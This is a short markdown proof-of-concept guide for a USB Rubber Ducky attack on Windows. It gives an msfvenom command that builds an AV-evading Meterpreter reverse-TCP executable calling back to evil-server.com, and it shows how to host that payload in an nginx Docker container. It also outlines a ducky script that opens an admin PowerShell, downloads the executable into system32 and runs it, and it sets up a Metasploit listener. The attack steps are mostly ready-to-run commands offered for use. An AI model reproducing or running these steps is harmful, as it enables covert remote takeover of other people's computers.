# Meterpreter reverse tcp session POC

## Create & encode the payload for windows defender evasion (older versions)

```bash
# lists the available encoders
$ msfvenom -l encoders
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=evil-server.com LPORT=4444 -e x86/shikata_ga_nai -f exe -o evil.exe
```

---

## Host the payload on a server

```bash
# creates a read-only server in a docker container
$ docker run -v /home/kali/payloads:/payloads:ro -p 80:80 -d nginx

# get the container id
$ docker container ls

# reconfigure nginx inside the container (change root to /payloads)
$ docker exec -it <id> bash
$ nano /etc/nginx/conf.d/default.conf

# create index.html
$ nano /payloads/index.html
```

---

## Create the ducky script

The script should:

0. open powershell (admin)

1. fetch exil.exe from the server to \C:\Windows\system32\*

2. .\evil.exe

3. close powershell

---

## Listen to the connection

```bash
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST <LOCAL_IP>
msf6 > run
```

Plug in the rubber ducky and hack the planet!